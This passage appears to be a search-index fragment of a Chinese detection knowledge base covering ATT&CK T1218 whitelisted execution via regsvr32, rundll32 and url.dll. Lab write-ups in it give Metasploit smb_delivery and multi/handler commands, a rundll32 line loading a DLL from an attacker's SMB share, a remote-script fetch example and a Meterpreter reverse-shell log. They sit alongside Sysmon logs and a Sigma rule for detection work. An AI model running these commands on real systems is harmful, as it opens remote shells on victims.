high","title":"sigma\u89c4\u5219"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/#_8","text":"\u901a\u8fc7\u8fdb\u7a0b\u76d1\u63a7\u6765\u68c0\u6d4b\u548c\u5206\u6790regsvr32.exe\u7684\u6267\u884c\u548c\u53c2\u6570\u3002\u6bd4\u8f83regsvr32.exe\u7684\u8fd1\u671f\u8c03\u7528\u4e0e\u5386\u53f2\u5df2\u77e5\u5408\u6cd5\u53c2\u6570\u53ca\u5df2\u52a0\u8f7d\u6587\u4ef6\u6765\u786e\u5b9a\u662f\u5426\u6709\u5f02\u5e38\u548c\u6f5c\u5728\u7684\u653b\u51fb\u6d3b\u52a8\u3002\u5728regsvr32.exe\u8c03\u7528\u4e4b\u524d\u548c\u4e4b\u540e\u4f7f\u7528\u7684\u547d\u4ee4\u53c2\u6570\u4e5f\u53ef\u7528\u4e8e\u786e\u5b9a\u6b63\u5728\u52a0\u8f7d\u7684\u811a\u672c\u6216\u8005\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u6765\u6e90\u548c\u76ee\u7684\u3002","title":"\u5efa\u8bae"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/#_9","text":"MITRE-ATT&CK-T1218-010 https://attack.mitre.org/techniques/T1218/010/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/","text":"T1218-011-win-\u57fa\u4e8e\u767d\u540d\u5355Rundll32.exe\u6267\u884cpayload \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 Rundll32.exe\u7a0b\u5e8f\u53ef\u4ee5\u8c03\u7528\u6765\u6267\u884c\u4efb\u610f\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u6b64\u529f\u80fd\u6765\u4ee3\u7406\u6267\u884c\u4ee3\u7801\uff0c\u4ece\u800c\u907f\u514d\u89e6\u53d1\u90a3\u4e9b\u53ef\u80fd\u4e0d\u4f1a\u76d1\u63a7rundll32.exe\u8fdb\u7a0b\u6267\u884c\u7684\u5b89\u5168\u5de5\u5177\uff0c\u56e0\u4e3a\u6b63\u5e38\u64cd\u4f5c\u4e2d\u4f7f\u7528rundll32.exe\u7684Windows\u4f1a\u6709\u767d\u540d\u5355\u6216\u8bef\u62a5\u3002 Rundll32.exe\u53ef\u7528\u4e8e\u901a\u8fc7\u672a\u8bb0\u5f55\u7684shell32.dll\u51fd\u6570Control_RunDLL\u548c Control_RunDLLAsUser\u6765\u6267\u884c\u63a7\u5236\u9762\u677f\u9879\u76ee\u6587\u4ef6\uff08.cpl\uff09\u3002\u53cc\u51fb.cpl\u6587\u4ef6\u4e5f\u4f1a\u89e6\u53d1rundll32.exe\u6267\u884c\u3002 Rundll32\u4e5f\u53ef\u7528\u4e8e\u6267\u884cJavaScript\u7b49\u811a\u672c\u3002\u53ef\u4ee5\u4f7f\u7528\u7c7b\u4f3c\u4e8e\u4e0b\u9762\u7684\u8bed\u6cd5\u6765\u5b8c\u6210\uff1arundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\" \u3002\u8fd9\u79cd\u65b9\u6cd5\u5df2\u88ab\u6076\u610f\u8f6f\u4ef6\u5982Poweliks\u6240\u4f7f\u7528\u3002 \u6d4b\u8bd5\u6848\u4f8b Rundll32.exe\u662f\u6307\u201c\u6267\u884c32\u4f4d\u7684DLL\u6587\u4ef6\u201d\u3002\u5b83\u7684\u4f5c\u7528\u662f\u6267\u884cDLL\u6587\u4ef6\u4e2d\u7684\u5185\u90e8\u51fd\u6570,\u529f\u80fd\u5c31\u662f\u4ee5\u547d\u4ee4\u884c\u7684\u65b9\u5f0f\u8c03\u7528\u52a8\u6001\u94fe\u63a5\u7a0b\u5e8f\u5e93\u3002 \u8bf4\u660e\uff1aRundll32.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cWmic\u547d\u4ee4\u53ef\u8bc6\u522b\uff0c\u9700\u6ce8\u610fx86\uff0cx64\u4f4d\u7684Rundll32\u8c03\u7528\u3002 windows 2003\u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\rundll32.exe C:\\Windows\\SysWOW64\\rundll32.exe win7\u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\rundll32.exe C:\\Windows\\SysWOW64\\rundll32.exe \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09 \u6d4b\u8bd5\u590d\u73b0 \u73af\u5883\u51c6\u5907 \u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awin7\uff08sysmon\u65e5\u5fd7\uff09 \u653b\u51fb\u5206\u6790 \u914d\u7f6eMSF msf5 > use exploit/windows/smb/smb_delivery msf5 exploit(windows/smb/smb_delivery) > set srvhost 192.168.126.146 srvhost => 192.168.126.146 msf5 exploit(windows/smb/smb_delivery) > exploit [*] Exploit running as background job 0. [*] Exploit completed, but no session was created. [*] Started reverse TCP handler on 192.168.126.146:4444 [*] Started service listener on 192.168.126.146:445 [*] Server started. [*] Run the following command on the target machine: rundll32.exe \\\\192.168.126.146\\huwSj\\test.dll,0 \u9776\u673a\u6267\u884cpayload rundll32.exe \\\\192.168.126.146\\huwSj\\test.dll,0 \u53cd\u5f39shell msf5 exploit(windows/smb/smb_delivery) > [*] Sending stage (180291 bytes) to 192.168.126.149 [*] Meterpreter session 1 opened (192.168.126.146:4444 -> 192.168.126.149:49381) at 2020-04-17 15:24:05 +0800 msf5 exploit(windows/smb/smb_delivery) > sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 meterpreter x86/windows 12306Br0-PC\\12306Br0 @ 12306BR0-PC 192.168.126.146:4444 -> 192.168.126.149:49381 (192.168.126.149) msf5 exploit(windows/smb/smb_delivery) > sessions 1 [*] Starting interaction with 1... meterpreter > getuid Server username: 12306Br0-PC\\12306Br0 \u6d4b\u8bd5\u7559\u75d5 sysmon\u65e5\u5fd7\u8bb0\u5f55 EVentID: 1 Image: C:\\Windows\\SysWOW64\\rundll32.exe FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255) Description: Windows host process (Rundll32) Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation OriginalFileName: RUNDLL32.EXE CommandLine: rundll32.exe \\\\192.168.126.146\\huwSj\\test.dll,0 win7\u5b89\u5168\u65e5\u5fd7\u8bb0\u5f55 EVentID: 4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0xa30 \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\SysWOW64\\rundll32.exe EVentID: 5158 \u5e94\u7528\u7a0b\u5e8f\u4fe1\u606f: \u8fdb\u7a0b ID: 2608 \u5e94\u7528\u7a0b\u5e8f\u540d\u79f0: \\device\\harddiskvolume2\\windows\\syswow64\\rundll32.exe EVentID: 5156 #Windows \u7b5b\u9009\u5e73\u53f0\u5df2\u5141\u8bb8\u8fde\u63a5\u3002 \u5e94\u7528\u7a0b\u5e8f\u4fe1\u606f: \u8fdb\u7a0b ID:2608 \u5e94\u7528\u7a0b\u5e8f\u540d\u79f0: \\device\\harddiskvolume2\\windows\\syswow64\\rundll32.exe \u7f51\u7edc\u4fe1\u606f: \u65b9\u5411: \u51fa\u7ad9 \u6e90\u5730\u5740: 192.168.126.149 \u6e90\u7aef\u53e3: 49381 \u76ee\u6807\u5730\u5740: 192.168.126.146 \u76ee\u6807\u7aef\u53e3: 4444 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma title: Suspicious Call by Ordinal id: e79a9e79-eb72-4e78-a628-0e7e8f59e89c description: Detects suspicious calls of DLLs in rundll32.dll exports by ordinal status: experimental references: - https://techtalk.pcmatic.com/2017/11/30/running-dll-files-malware-analysis/ - https://github.com/Neo23x0/DLLRunner - https://twitter.com/cyb3rops/status/1186631731543236608 tags: - attack.defense_evasion - attack.execution - attack.t1085 author: Florian Roth date: 2019/10/22 logsource: category: process_creation product: windows detection: selection: CommandLine: '*\\rundll32.exe *,#*' condition: selection falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment - Windows contol panel elements have been identified as source (mmc) level: high \u5efa\u8bae \u901a\u8fc7\u8fdb\u7a0b\u76d1\u63a7\u6765\u68c0\u6d4b\u548c\u5206\u6790rundll32.exe\u7684\u6267\u884c\u548c\u53c2\u6570\u3002\u6bd4\u8f83rundll32.exe\u7684\u8fd1\u671f\u8c03\u7528\u4e0e\u5386\u53f2\u5df2\u77e5\u5408\u6cd5\u53c2\u6570\u53ca\u5df2\u52a0\u8f7d\u52a8\u6001\u94fe\u63a5\u5e93\u6765\u786e\u5b9a\u662f\u5426\u6709\u5f02\u5e38\u548c\u6f5c\u5728\u7684\u653b\u51fb\u6d3b\u52a8\u3002\u5728rundll32.exe\u8c03\u7528\u4e4b\u524d\u548c\u4e4b\u540e\u4f7f\u7528\u7684\u547d\u4ee4\u53c2\u6570\u4e5f\u53ef\u7528\u4e8e\u786e\u5b9a\u6b63\u5728\u52a0\u8f7d\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u6765\u6e90\u548c\u76ee\u7684\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1218-011 https://attack.mitre.org/techniques/T1218/011/ windows\u4e0b\u57fa\u4e8e\u767d\u540d\u5355\u83b7\u53d6shell\u7684\u65b9\u6cd5\u6574\u7406\uff08\u4e0a\uff09 http://www.safe6.cn/article/155","title":"T1218-011-win-\u57fa\u4e8e\u767d\u540d\u5355Rundll32.exe\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/#t1218-011-win-rundll32exepayload","text":"","title":"T1218-011-win-\u57fa\u4e8e\u767d\u540d\u5355Rundll32.exe\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/#attck","text":"Rundll32.exe\u7a0b\u5e8f\u53ef\u4ee5\u8c03\u7528\u6765\u6267\u884c\u4efb\u610f\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u6b64\u529f\u80fd\u6765\u4ee3\u7406\u6267\u884c\u4ee3\u7801\uff0c\u4ece\u800c\u907f\u514d\u89e6\u53d1\u90a3\u4e9b\u53ef\u80fd\u4e0d\u4f1a\u76d1\u63a7rundll32.exe\u8fdb\u7a0b\u6267\u884c\u7684\u5b89\u5168\u5de5\u5177\uff0c\u56e0\u4e3a\u6b63\u5e38\u64cd\u4f5c\u4e2d\u4f7f\u7528rundll32.exe\u7684Windows\u4f1a\u6709\u767d\u540d\u5355\u6216\u8bef\u62a5\u3002 Rundll32.exe\u53ef\u7528\u4e8e\u901a\u8fc7\u672a\u8bb0\u5f55\u7684shell32.dll\u51fd\u6570Control_RunDLL\u548c Control_RunDLLAsUser\u6765\u6267\u884c\u63a7\u5236\u9762\u677f\u9879\u76ee\u6587\u4ef6\uff08.cpl\uff09\u3002\u53cc\u51fb.cpl\u6587\u4ef6\u4e5f\u4f1a\u89e6\u53d1rundll32.exe\u6267\u884c\u3002 Rundll32\u4e5f\u53ef\u7528\u4e8e\u6267\u884cJavaScript\u7b49\u811a\u672c\u3002\u53ef\u4ee5\u4f7f\u7528\u7c7b\u4f3c\u4e8e\u4e0b\u9762\u7684\u8bed\u6cd5\u6765\u5b8c\u6210\uff1arundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\" \u3002\u8fd9\u79cd\u65b9\u6cd5\u5df2\u88ab\u6076\u610f\u8f6f\u4ef6\u5982Poweliks\u6240\u4f7f\u7528\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/#_1","text":"Rundll32.exe\u662f\u6307\u201c\u6267\u884c32\u4f4d\u7684DLL\u6587\u4ef6\u201d\u3002\u5b83\u7684\u4f5c\u7528\u662f\u6267\u884cDLL\u6587\u4ef6\u4e2d\u7684\u5185\u90e8\u51fd\u6570,\u529f\u80fd\u5c31\u662f\u4ee5\u547d\u4ee4\u884c\u7684\u65b9\u5f0f\u8c03\u7528\u52a8\u6001\u94fe\u63a5\u7a0b\u5e8f\u5e93\u3002 \u8bf4\u660e\uff1aRundll32.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cWmic\u547d\u4ee4\u53ef\u8bc6\u522b\uff0c\u9700\u6ce8\u610fx86\uff0cx64\u4f4d\u7684Rundll32\u8c03\u7528\u3002 windows 2003\u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\rundll32.exe C:\\Windows\\SysWOW64\\rundll32.exe win7\u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\rundll32.exe C:\\Windows\\SysWOW64\\rundll32.exe \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/#_4","text":"\u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awin7\uff08sysmon\u65e5\u5fd7\uff09","title":"\u73af\u5883\u51c6\u5907"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/#_5","text":"","title":"\u653b\u51fb\u5206\u6790"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/#msf","text":"msf5 > use exploit/windows/smb/smb_delivery msf5 exploit(windows/smb/smb_delivery) > set srvhost 192.168.126.146 srvhost => 192.168.126.146 msf5 exploit(windows/smb/smb_delivery) > exploit [*] Exploit running as background job 0. [*] Exploit completed, but no session was created. [*] Started reverse TCP handler on 192.168.126.146:4444 [*] Started service listener on 192.168.126.146:445 [*] Server started. [*] Run the following command on the target machine: rundll32.exe \\\\192.168.126.146\\huwSj\\test.dll,0","title":"\u914d\u7f6eMSF"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/#payload","text":"rundll32.exe \\\\192.168.126.146\\huwSj\\test.dll,0","title":"\u9776\u673a\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/#shell","text":"msf5 exploit(windows/smb/smb_delivery) > [*] Sending stage (180291 bytes) to 192.168.126.149 [*] Meterpreter session 1 opened (192.168.126.146:4444 -> 192.168.126.149:49381) at 2020-04-17 15:24:05 +0800 msf5 exploit(windows/smb/smb_delivery) > sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 meterpreter x86/windows 12306Br0-PC\\12306Br0 @ 12306BR0-PC 192.168.126.146:4444 -> 192.168.126.149:49381 (192.168.126.149) msf5 exploit(windows/smb/smb_delivery) > sessions 1 [*] Starting interaction with 1... meterpreter > getuid Server username: 12306Br0-PC\\12306Br0","title":"\u53cd\u5f39shell"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/#_6","text":"sysmon\u65e5\u5fd7\u8bb0\u5f55 EVentID: 1 Image: C:\\Windows\\SysWOW64\\rundll32.exe FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255) Description: Windows host process (Rundll32) Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation OriginalFileName: RUNDLL32.EXE CommandLine: rundll32.exe \\\\192.168.126.146\\huwSj\\test.dll,0 win7\u5b89\u5168\u65e5\u5fd7\u8bb0\u5f55 EVentID: 4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0xa30 \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\SysWOW64\\rundll32.exe EVentID: 5158 \u5e94\u7528\u7a0b\u5e8f\u4fe1\u606f: \u8fdb\u7a0b ID: 2608 \u5e94\u7528\u7a0b\u5e8f\u540d\u79f0: \\device\\harddiskvolume2\\windows\\syswow64\\rundll32.exe EVentID: 5156 #Windows \u7b5b\u9009\u5e73\u53f0\u5df2\u5141\u8bb8\u8fde\u63a5\u3002 \u5e94\u7528\u7a0b\u5e8f\u4fe1\u606f: \u8fdb\u7a0b ID:2608 \u5e94\u7528\u7a0b\u5e8f\u540d\u79f0: \\device\\harddiskvolume2\\windows\\syswow64\\rundll32.exe \u7f51\u7edc\u4fe1\u606f: \u65b9\u5411: \u51fa\u7ad9 \u6e90\u5730\u5740: 192.168.126.149 \u6e90\u7aef\u53e3: 49381 \u76ee\u6807\u5730\u5740: 192.168.126.146 \u76ee\u6807\u7aef\u53e3: 4444","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/#_7","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/#sigma","text":"title: Suspicious Call by Ordinal id: e79a9e79-eb72-4e78-a628-0e7e8f59e89c description: Detects suspicious calls of DLLs in rundll32.dll exports by ordinal status: experimental references: - https://techtalk.pcmatic.com/2017/11/30/running-dll-files-malware-analysis/ - https://github.com/Neo23x0/DLLRunner - https://twitter.com/cyb3rops/status/1186631731543236608 tags: - attack.defense_evasion - attack.execution - attack.t1085 author: Florian Roth date: 2019/10/22 logsource: category: process_creation product: windows detection: selection: CommandLine: '*\\rundll32.exe *,#*' condition: selection falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment - Windows contol panel elements have been identified as source (mmc) level: high","title":"sigma"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/#_8","text":"\u901a\u8fc7\u8fdb\u7a0b\u76d1\u63a7\u6765\u68c0\u6d4b\u548c\u5206\u6790rundll32.exe\u7684\u6267\u884c\u548c\u53c2\u6570\u3002\u6bd4\u8f83rundll32.exe\u7684\u8fd1\u671f\u8c03\u7528\u4e0e\u5386\u53f2\u5df2\u77e5\u5408\u6cd5\u53c2\u6570\u53ca\u5df2\u52a0\u8f7d\u52a8\u6001\u94fe\u63a5\u5e93\u6765\u786e\u5b9a\u662f\u5426\u6709\u5f02\u5e38\u548c\u6f5c\u5728\u7684\u653b\u51fb\u6d3b\u52a8\u3002\u5728rundll32.exe\u8c03\u7528\u4e4b\u524d\u548c\u4e4b\u540e\u4f7f\u7528\u7684\u547d\u4ee4\u53c2\u6570\u4e5f\u53ef\u7528\u4e8e\u786e\u5b9a\u6b63\u5728\u52a0\u8f7d\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u6765\u6e90\u548c\u76ee\u7684\u3002","title":"\u5efa\u8bae"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/#_9","text":"MITRE-ATT&CK-T1218-011 https://attack.mitre.org/techniques/T1218/011/ windows\u4e0b\u57fa\u4e8e\u767d\u540d\u5355\u83b7\u53d6shell\u7684\u65b9\u6cd5\u6574\u7406\uff08\u4e0a\uff09 http://www.safe6.cn/article/155","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/","text":"T1218-011-win-\u57fa\u4e8e\u767d\u540d\u5355url.dll\u6267\u884cpayload \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 Rundll32.exe\u7a0b\u5e8f\u53ef\u4ee5\u8c03\u7528\u6765\u6267\u884c\u4efb\u610f\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u6b64\u529f\u80fd\u6765\u4ee3\u7406\u6267\u884c\u4ee3\u7801\uff0c\u4ece\u800c\u907f\u514d\u89e6\u53d1\u90a3\u4e9b\u53ef\u80fd\u4e0d\u4f1a\u76d1\u63a7rundll32.exe\u8fdb\u7a0b\u6267\u884c\u7684\u5b89\u5168\u5de5\u5177\uff0c\u56e0\u4e3a\u6b63\u5e38\u64cd\u4f5c\u4e2d\u4f7f\u7528rundll32.exe\u7684Windows\u4f1a\u6709\u767d\u540d\u5355\u6216\u8bef\u62a5\u3002 Rundll32.exe\u53ef\u7528\u4e8e\u901a\u8fc7\u672a\u8bb0\u5f55\u7684shell32.dll\u51fd\u6570Control_RunDLL\u548c Control_RunDLLAsUser\u6765\u6267\u884c\u63a7\u5236\u9762\u677f\u9879\u76ee\u6587\u4ef6\uff08.cpl\uff09\u3002\u53cc\u51fb.cpl\u6587\u4ef6\u4e5f\u4f1a\u89e6\u53d1rundll32.exe\u6267\u884c\u3002 Rundll32\u4e5f\u53ef\u7528\u4e8e\u6267\u884cJavaScript\u7b49\u811a\u672c\u3002\u53ef\u4ee5\u4f7f\u7528\u7c7b\u4f3c\u4e8e\u4e0b\u9762\u7684\u8bed\u6cd5\u6765\u5b8c\u6210\uff1arundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\" \u3002\u8fd9\u79cd\u65b9\u6cd5\u5df2\u88ab\u6076\u610f\u8f6f\u4ef6\u5982Poweliks\u6240\u4f7f\u7528\u3002 \u6d4b\u8bd5\u6848\u4f8b url.dll\u662fInternet\u5feb\u6377\u58f3\u6269\u5c55\u76f8\u5173\u5e94\u7528\u7a0b\u5e8f\u63a5\u53e3\u7cfb\u7edf\u6587\u4ef6\u3002 \u8bf4\u660e\uff1aurl.dll\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0curl.dll\u547d\u4ee4\u53ef\u8bc6\u522b\uff0c\u4f46\u7531\u4e8e\u4e3adll\u6587\u4ef6\uff0c\u9700\u8c03\u7528rundll32.exe\u6765\u6267\u884c\u3002 Windows 2003 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\url.dll C:\\Windows\\SysWOW64\\url.dll Windows 7 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\url.dll C:\\Windows\\SysWOW64\\url.dll \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09 \u6d4b\u8bd5\u590d\u73b0 \u73af\u5883\u51c6\u5907 \u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awin7\uff08sysmon\u65e5\u5fd7\uff09 \u653b\u51fb\u5206\u6790 \u914d\u7f6eMSF msf5 exploit(multi/handler) > back msf5 > use exploit/multi/handler msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp payload => windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) > set lhost 192.168.126.146 lhost => 192.168.126.146 msf5 exploit(multi/handler) > set lport 4444 lport => 4444 msf5 exploit(multi/handler) > exploit \u9776\u673a\u6267\u884cshell.bin msfvenom -a x86 --platform windows 